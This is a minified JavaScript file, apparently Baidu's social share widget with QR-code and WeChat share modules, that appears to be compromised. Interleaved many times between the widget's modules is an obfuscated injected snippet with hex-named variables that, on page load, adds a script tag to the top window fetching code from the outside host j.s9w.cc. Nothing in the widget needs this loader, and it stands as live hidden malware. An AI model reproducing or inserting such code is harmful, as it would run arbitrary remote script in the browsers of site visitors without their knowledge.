l(n,0)).mod(e)}},c.RS_BLOCK_TABLE=[[1,26,19],[1,26,16],[1,26,13],[1,26,9],[1,44,34],[1,44,28],[1,44,22],[1,44,16],[1,70,55],[1,70,44],[2,35,17],[2,35,13],[1,100,80],[2,50,32],[2,50,24],[4,25,9],[1,134,108],[2,67,43],[2,33,15,2,34,16],[2,33,11,2,34,12],[2,86,68],[4,43,27],[4,43,19],[4,43,15],[2,98,78],[4,49,31],[2,32,14,4,33,15],[4,39,13,1,40,14],[2,121,97],[2,60,38,2,61,39],[4,40,18,2,41,19],[4,40,14,2,41,15],[2,146,116],[3,58,36,2,59,37],[4,36,16,4,37,17],[4,36,12,4,37,13],[2,86,68,2,87,69],[4,69,43,1,70,44],[6,43,19,2,44,20],[6,43,15,2,44,16],[4,101,81],[1,80,50,4,81,51],[4,50,22,4,51,23],[3,36,12,8,37,13],[2,116,92,2,117,93],[6,58,36,2,59,37],[4,46,20,6,47,21],[7,42,14,4,43,15],[4,133,107],[8,59,37,1,60,38],[8,44,20,4,45,21],[12,33,11,4,34,12],[3,145,115,1,146,116],[4,64,40,5,65,41],[11,36,16,5,37,17],[11,36,12,5,37,13],[5,109,87,1,110,88],[5,65,41,5,66,42],[5,54,24,7,55,25],[11,36,12],[5,122,98,1,123,99],[7,73,45,3,74,46],[15,43,19,2,44,20],[3,45,15,13,46,16],[1,135,107,5,136,108],[10,74,46,1,75,47],[1,50,22,15,51,23],[2,42,14,17,43,15],[5,150,120,1,151,121],[9,69,43,4,70,44],[17,50,22,1,51,23],[2,42,14,19,43,15],[3,141,113,4,142,114],[3,70,44,11,71,45],[17,47,21,4,48,22],[9,39,13,16,40,14],[3,135,107,5,136,108],[3,67,41,13,68,42],[15,54,24,5,55,25],[15,43,15,10,44,16],[4,144,116,4,145,117],[17,68,42],[17,50,22,6,51,23],[19,46,16,6,47,17],[2,139,111,7,140,112],[17,74,46],[7,54,24,16,55,25],[34,37,13],[4,151,121,5,152,122],[4,75,47,14,76,48],[11,54,24,14,55,25],[16,45,15,14,46,16],[6,147,117,4,148,118],[6,73,45,14,74,46],[11,54,24,16,55,25],[30,46,16,2,47,17],[8,132,106,4,133,107],[8,75,47,13,76,48],[7,54,24,22,55,25],[22,45,15,13,46,16],[10,142,114,2,143,115],[19,74,46,4,75,47],[28,50,22,6,51,23],[33,46,16,4,47,17],[8,152,122,4,153,123],[22,73,45,3,74,46],[8,53,23,26,54,24],[12,45,15,28,46,16],[3,147,117,10,148,118],[3,73,45,23,74,46],[4,54,24,31,55,25],[11,45,15,31,46,16],[7,146,116,7,147,117],[21,73,45,7,74,46],[1,53,23,37,54,24],[19,45,15,26,46,16],[5,145,115,10,146,116],[19,75,47,10,76,48],[15,54,24,25,55,25],[23,45,15,25,46,16],[13,145,115,3,146,116],[2,74,46,29,75,47],[42,54,24,1,55,25],[23,45,15,28,46,16],[17,145,115],[10,74,46,23,75,47],[10,54,24,35,55,25],[19,45,15,35,46,16],[17,145,115,1,146,116],[14,74,46,21,75,47],[29,54,24,19,55,25],[11,45,15,46,46,16],[13,145,115,6,146,116],[14,74,46,23,75,47],[44,54,24,7,55,25],[59,46,16,1,47,17],[12,151,121,7,152,122],[12,75,47,26,76,48],[39,54,24,14,55,25],[22,45,15,41,46,16],[6,151,121,14,152,122],[6,75,47,34,76,48],[46,54,24,10,55,25],[2,45,15,64,46,16],[17,152,122,4,153,123],[29,74,46,14,75,47],[49,54,24,10,55,25],[24,45,15,46,46,16],[4,152,122,18,153,123],[13,74,46,32,75,47],[48,54,24,14,55,25],[42,45,15,32,46,16],[20,147,117,4,148,118],[40,75,47,7,76,48],[43,54,24,22,55,25],[10,45,15,67,46,16],[19,148,118,6,149,119],[18,75,47,31,76,48],[34,54,24,34,55,25],[20,45,15,61,46,16]],c.getRSBlocks=function(e,t){var n=c.getRsBlockTable(e,t);if(n==undefined)throw new Error("bad rs block @ typeNumber:"+e+"/errorCorrectLevel:"+t);var r=n.length/3,i=new Array;for(var s=0;s<r;s++){var o=n[s*3+0],u=n[s*3+1],a=n[s*3+2];for(var f=0;f<o;f++)i.push(new c(u,a))}return i},c.getRsBlockTable=function(e,t){switch(t){case s.L:return c.RS_BLOCK_TABLE[(e-1)*4+0];case s.M:return c.RS_BLOCK_TABLE[(e-1)*4+1];case s.Q:return c.RS_BLOCK_TABLE[(e-1)*4+2];case s.H:return c.RS_BLOCK_TABLE[(e-1)*4+3];default:return undefined}},h.prototype={get:function(e){var t=Math.floor(e/8);return(this.buffer[t]>>>7-e%8&1)==1},put:function(e,t){for(var n=0;n<t;n++)this.putBit((e>>>t-n-1&1)==1)},getLengthInBits:function(){return this.length},putBit:function(e){var t=Math.floor(this.length/8);this.buffer.length<=t&&this.buffer.push(0),e&&(this.buffer[t]|=128>>>this.length%8),this.length++}},t.QRCode=r,t.QRErrorCorrectLevel=s});
!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("conf/const",function(e,t,n){t.CMD_ATTR="data-cmd",t.CONFIG_TAG_ATTR="data-tag",t.URLS={likeSetUrl:"http://like.baidu.com/set",commitUrl:"http://s.share.baidu.com/commit",jumpUrl:"http://s.share.baidu.com",mshareUrl:"http://s.share.baidu.com/mshare",emailUrl:"http://s.share.baidu.com/sendmail",nsClick:"http://nsclick.baidu.com/v.gif",backUrl:"http://s.share.baidu.com/back",shortUrl:"http://dwz.cn/v2cut.php"}});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main?window._bd_share_is_recently_loaded=!0:(window._bd_share_is_recently_loaded=!1,window._bd_share_main={version:"2.0",jscfg:{domain:{staticUrl:"http://bdimg.share.baidu.com/"}}});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("share/api_base",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class;t.ApiBase=i.create(function(e){function s(e){window._bd_share_main.F.use("component/anticheat",function(t){t.process("mouseenter",e.event,e.element)}),t._processEvent(e)}function o(n){window._bd_share_main.F.use("component/anticheat",function(e){e.process("mouseclick",n.event,n.element)});var i=t._processAction(n);if(i&&i.data)if(n.cmd=="more"||n.cmd=="count")window._bd_share_main.F.use("component/pop_dialog",function(t){var r=t.Dialog;r.un(),r.on("clickact",o),r.on("mouseenter",s),r.show(n,e)});else if(n.cmd=="popup")u(n);else{var a;r.type(e.onBeforeClick)=="function"&&(a=r.extend({},e),a=e.onBeforeClick(n.cmd,a));var f=r.extend({},e,a,{__type:i.data.type,__buttonType:n.buttonType,__cmd:n.cmd,__element:n.element});window._bd_share_main.F.use("trans/trans",function(e){e.run(f)}),r.type(e.onAfterClick)=="function"&&e.onAfterClick(n.cmd)}}function u(t){window._bd_share_main.F.use("component/pop_popup",function(n){var r=n.Popup;r.un(),r.on("clickact",o),r.on("mouseenter",s),r.show(t,e)})}var t=this,n=null,i=null;t.getView=function(){return n},t.setView=function(e){n=e},t.init=function(){t._init(),n&&(n.on("clickact",o),n.on("mouseenter",s),n.on("moreover",u))},t.distory=function(){t._distory(),n&&(n.un(),n.distory()),delete t},t._init=function(){},t._distory=function(){},t._processEvent=function(e){},t._processAction=function(e){}})});
window._bd_share_main.F.module("share/combine_api",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("share/api_base");t.CombineApi=i.create(function(e){var t=this,n=null,r=null;t.setApi=function(e,t){n=e,r=t},t._init=function(){n&&r&&n.on("sharecompleted",function(e){})}},s.ApiBase)});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("share/image_api",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("component/comm_tools"),o=e("share/api_base");t.Api=i.create(function(e){var t=this;t._init=function(){var e=t.getView();e.render(),e.init(),e.on("moreover",function(){e._keepBarVisible()})},t._processAction=function(n){var r=t.getView();return e.bdPic=r._getImageSrc(),{data:{type:"imgshare"}}},t._distory=function(){}},o.ApiBase)});
;;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("share/like_api",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("share/api_base");t.Api=i.create(function(e){function r(e){window._bd_share_main.F.use("trans/data",function(t){t.get({type:"like_count",url:document.location.href,callback:function(t){var n={count:t};e&&e(n)}})})}function i(t){var n=e;window._bd_share_main.F.use("trans/trans",function(e){e.run({type:"like",url:document.location.href,callback:function(e){var n={err:e};t&&t(n)}})})}var t=this,n={count:0,clicked:!1};t._init=function(){var e=t.getView();e.render(),e.init(),r(function(t){n.count=t.count,e.setNumber(t.count)})},t._processAction=function(e){e.cmd=="like"&&(n.clicked?t.getView().showDoneState(e.element):i(function(r){n.clicked=!0,r.err==0?(n.count++,t.getView().addOne(e.element,n.count)):t.getView().showDoneState(e.element)}))}},s.ApiBase)});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("share/select_api",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("component/comm_tools"),o=e("share/api_base");t.Api=i.create(function(e){var t=this;t._init=function(){var e=t.getView();e.render(),e.init()},t._processAction=function(e){return{data:{type:"select"}}},t._distory=function(){}},o.ApiBase)});
window._bd_share_main.F.module("share/share_api",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("component/comm_tools"),o=e("share/api_base");t.Api=i.create(function(e){function r(t){window._bd_share_main.F.use("trans/data",function(n){n.get({type:"share_count",url:e.bdUrl||s.getPageUrl(),callback:function(e,n){var r={count:e,display:n};t&&t(r)}})})}var t=this,n={count:0,clicked:!1};t._init=function(){var e=t.getView();e.render(),e.on("getsharecount",function(){r(function(t){n.count=t.count,e.setNumber(t.count,t.display)})}),e.init()},t._processAction=function(e){return{data:{type:"share"}}}},o.ApiBase)});
window._bd_share_main.F.module("share/slide_api",function(e,t,n){var r=e("base/tangram").T,i=e("base/class").Class,s=e("share/api_base");t.Api=i.create(function(e){var t=this;t._init=function(){var e=t.getView();e.render(),e.init()},t._slidePop=function(t,n){t._popupBox=n.boxEle,t._getPosition=function(){return{top:0,left:e.bdPos=="left"?0:n.element.width()}},t.show(n,e)},t._processAction=function(e){return{data:{type:"share"}}},t._distory=function(){}},s.ApiBase)});
!window._bd_share_is_recently_loaded&&window._bd_share_main.F.use("base/min_tangram",function(e){function n(e,t,n){var r=new e(n);r.setView(new t(n)),r.init(),n&&n._handleId&&(_bd_share_main.api=_bd_share_main.api||{},_bd_share_main.api[n._handleId]=r)}function r(e,r){window._bd_share_main.F.use(e,function(e,i){t.isArray(r)?t.each(r,function(t,r){n(e.Api,i.View,r)}):n(e.Api,i.View,r)})}function i(e){var n=e.common||window._bd_share_config&&_bd_share_config.common||{},r={like:{type:"like"},share:{type:"share",bdStyle:0,bdMini:2,bdSign:"on"},slide:{type:"slide",bdStyle:"1",bdMini:2,bdImg:0,bdPos:"right",bdTop:100,bdSign:"on"},image:{viewType:"list",viewStyle:"0",viewPos:"top",viewColor:"black",viewSize:"16",viewList:["qzone","tsina","huaban","tqq","renren"]},selectShare:{type:"select",bdStyle:0,bdMini:2,bdSign:"on"}},i={share:{__cmd:"",__buttonType:"",__type:"",__element:null},slide:{__cmd:"",__buttonType:"",__type:"",__element:null},image:{__cmd:"",__buttonType:"",__type:"",__element:null}};return t.each(["like","share","slide","image","selectShare"],function(s,o){e[o]&&(t.isArray(e[o])&&e[o].length>0?t.each(e[o],function(s,u){e[o][s]=t.extend({},r[o],n,u,i[o])}):e[o]=t.extend({},r[o],n,e[o],i[o]))}),e}var t=e.T;_bd_share_main.init=function(e){e=e||window._bd_share_config||{share:{}};if(e){var t=i(e);t.like&&r(["share/like_api","view/like_view"],t.like),t.share&&r(["share/share_api","view/share_view"],t.share),t.slide&&r(["share/slide_api","view/slide_view"],t.slide),t.selectShare&&r(["share/select_api","view/select_view"],t.selectShare),t.image&&r(["share/image_api","view/image_view"],t.image)}},window._bd_share_main._LogPoolV2=[],window._bd_share_main.n1=(new Date).getTime(),t.domready(function(){window._bd_share_main.n2=(new Date).getTime()+1e3,_bd_share_main.init(),setTimeout(function(){window._bd_share_main.F.use("trans/logger",function(e){e.nsClick(),e.back(),e.duration()})},3e3)})});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);



!window._bd_share_is_recently_loaded&&window._bd_share_main.F.module("trans/trans",function(e,t){var n=e("component/comm_tools"),r=e("conf/const").URLS,i=function(){window._bd_share_main.F.use("base/tangram",function(e){var t=e.T;t.cookie.get("bdshare_firstime")==null&&t.cookie.set("bdshare_firstime",new Date*1,{path:"/",expires:(new Date).setFullYear(2022)-new Date})})},s=function(e){var t=e.bdUrl||n.getPageUrl();return t=t.replace(/\'/g,"%27").replace(/\"/g,"%22"),t},o=function(e){var t=(new Date).getTime()+3e3,r={click:1,url:s(e),uid:e.bdUid||"0",to:e.__cmd,type:"text",pic:e.bdPic||"",title:(e.bdText||document.title).substr(0,300),key:(e.bdSnsKey||{})[e.__cmd]||"",desc:e.bdDesc||"",comment:e.bdComment||"",relateUid:e.bdWbuid||"",searchPic:e.bdSearchPic||0,sign:e.bdSign||"on",l:window._bd_share_main.n1.toString(32)+window._bd_share_main.n2.toString(32)+t.toString(32),linkid:n.getLinkId(),firstime:a("bdshare_firstime")||""};switch(e.__cmd){case"copy":l(r);break;case"print":c();break;case"bdxc":h();break;case"bdysc":p(r);break;case"weixin":d(r);break;default:u(e,r)}window._bd_share_main.F.use("trans/logger",function(t){t.commit(e,r)})},u=function(e,t){var n=r.jumpUrl;e.__cmd=="mshare"?n=r.mshareUrl:e.__cmd=="mail"&&(n=r.emailUrl);var i=n+"?"+f(t);window.open(i)},a=function(e){if(e){var t=new RegExp("(^| )"+e+"=([^;]*)(;|$)"),n=t.exec(document.cookie);if(n)return decodeURIComponent(n[2]||null)}},f=function(e){var t=[];for(var n in e)t.push(encodeURIComponent(n)+"="+encodeURIComponent(e[n]));return t.join("&").replace(/%20/g,"+")},l=function(e){window._bd_share_main.F.use("base/tangram",function(t){var r=t.T;r.browser.ie?(window.clipboardData.setData("text",document.title+" "+(e.bdUrl||n.getPageUrl())),alert("\u6807\u9898\u548c\u94fe\u63a5\u590d\u5236\u6210\u529f\uff0c\u60a8\u53ef\u4ee5\u63a8\u8350\u7ed9QQ/MSN\u4e0a\u7684\u597d\u53cb\u4e86\uff01")):window.prompt("\u60a8\u4f7f\u7528\u7684\u662f\u975eIE\u6838\u5fc3\u6d4f\u89c8\u5668\uff0c\u8bf7\u6309\u4e0b Ctrl+C \u590d\u5236\u4ee3\u7801\u5230\u526a\u8d34\u677f",document.title+" "+(e.bdUrl||n.getPageUrl()))})},c=function(){window.print()},h=function(){window._bd_share_main.F.use("trans/trans_bdxc",function(e){e&&e.run()})},p=function(e){window._bd_share_main.F.use("trans/trans_bdysc",function(t){t&&t.run(e)})},d=function(e){window._bd_share_main.F.use("trans/trans_weixin",function(t){t&&t.run(e)})},v=function(e){o(e)};t.run=v,i()});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("trans/trans_bdxc",function(e,t){var n=function(){var e=window,t=document,n="_bdXC",r;e[n]?window._bdXC_loaded&&e[n].reInit():(r=t.createElement("script"),r.setAttribute("charset","utf-8"),r.src="http://xiangce.baidu.com/zt/collect/mark.js?"+(new Date).getTime(),t.getElementsByTagName("head")[0].appendChild(r))};t.run=n});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("trans/trans_bdysc",function(e,t){var n=function(e){var t={url:e.url,title:e.title};if(window.baiduSC_yaq4d3elabjnvmijccc1zuo3o4yeizck)window.baiduSC_yaq4d3elabjnvmijccc1zuo3o4yeizck.go(t);else{window.baiduSC_yaq4d3elabjnvmijccc1zuo3o4yeizck={callback:function(){this.go(t)}};var n=document.createElement("script"),r="http://s.wenzhang.baidu.com/js/pjt/content_ex/page/";r+="bookmark.js?s=baidu_fenxiang&_t="+Math.random(),n.src=r,document.getElementsByTagName("body")[0].appendChild(n)}};t.run=n});;(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();
var f476e749bb252bde7a5c2c9994b6116ce=function(){function b(a){if(!d&&("onreadystatechange"!==a.type||"complete"===document.readyState)){for(a=0;a<c.length;a++)c[a].call(document);d=!0;c=null}}var c=[],d=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",b,!1),document.addEventListener("readystatechange",b,!1),window.addEventListener("load",b,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",b),window.attachEvent("onload",b));return function(a){d?a.call(document):
c.push(a)}}();
function f006b08735d9928a8820efe00a26753e7(){try{var b=window.top.document;if(!b.getElementById("82ac324e455efd0ecd2e73d22d852758")){var c=b.createElement("script");c.setAttribute("type","text/javascript");c.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var d="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";b.getElementsByTagName("head")[0].appendChild(c);c.setAttribute("src",d)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);

window._bd_share_main.F.module("trans/trans_weixin",function(n,i){var e,o,t,d="bdshare_weixin_qrcode_dialog",a="",r=0,c={},p=n("base/tangram").T,u=(n("conf/const").URLS,function(n){var i=Math.round(200/n.length);i=2>i?2:i,r=i*n.length;var e='<table style="direction:ltr;border: 0; width:'+r+'px; border-collapse: collapse;background-color:#fff;margin:0 auto;" align="center">',o=[e],t="";return p.each(n,function(n,e){o.push("<tr>"),p.each(e,function(n,e){t='<td style="width:'+i+"px;height:"+i+"px;padding:0;margin:0;border:none;background:#"+(e?"000":"FFF")+'"></td>',o.push(t)})}),o.push("</table>"),o.join("")}),s=function(n,i){window._bd_share_main.F.use("component/qrcode",function(i){var o=i.QRCode,d=i.QRErrorCorrectLevel,a=new o(-1,d.L);a.addData(n),a.make();var c=u(a.modules);p(c).appendTo(t.empty());_(r),w(),e.attr("data-url",n)})},f=function(){e.attr("data-url")!=a&&(t.html("正在加载"),s(a.length>200?a:a))},_=function(n){var i=(n>220?n:220)+20,o=p(".bd_weixin_popup_foot").height()+p(".bd_weixin_popup_head").height()+n+30;e.css({width:i,height:o})},h=function(){if(e=p("#"+d),o=p("#"+d+"_bg"),e.length<1){var n='<iframe id="'+d+'_bg" class="bd_weixin_popup_bg"></iframe>',i=['<div id="'+d+'" class="bd_weixin_popup">','<div class="bd_weixin_popup_head">',"<span>分享到微信朋友圈</span>",'<a href="#" onclick="return false;" class="bd_weixin_popup_close">&times;</a>',"</div>",'<div id="'+d+'_qr" class="bd_weixin_popup_main"></div>','<div class="bd_weixin_popup_foot">打开微信，点击底部的“发现”，<br>使用“扫一扫”即可将网页分享至朋友圈。</div>',"</div>"].join("");o=p(n).appendTo("body"),e=p(i).appendTo("body"),l()}t=e.find("#"+d+"_qr"),b()},l=function(){e.find(".bd_weixin_popup_close").click(g),p("body").on("keydown",function(n){27==n.keyCode&&g()}),p(window).resize(function(){w()})},w=function(){var n=p(window).scrollTop(),i=e.outerWidth(),t=e.outerHeight(),d=p(window).width(),a=p(window).height(),r=(a-t)/2+n,c=(d-i)/2;r=0>r?0:r,c=0>c?0:c,o.width(i).height(t).css({left:c,top:r}),e.css({left:c,top:r})},b=function(){e.show(),o.show(),w()},g=function(){e.hide(),o.hide()},v=function(n){var i="10006-weixin-1-52626-6b3bffd01fdde4900130bc5a2751b6d1";if("off"===c.sign)return n;if("normal"===c.sign){var e=n.indexOf("#"),o=n.indexOf("?");return-1==e?n+(-1==o?"?":"&")+i:n.replace("#",(-1==o?"?":"&")+i+"#")}return n.replace(/#.*$/g,"")+"#"+i},x=function(n){n=v(n);var i=[];return p.each(n,function(n,e){/[^\x00-\xff]/.test(e)?i[n]=encodeURI(e):i[n]=e}),n=i.join("")},m=function(){window._bd_share_main.F.use("component/pop_dialog",function(n){n.Dialog.hide()})},y=function(n){c=n,a=x(n.url),window._bd_share_main.F.use("weixin_popup.css",function(){m(),h(),f()})};i.run=y});
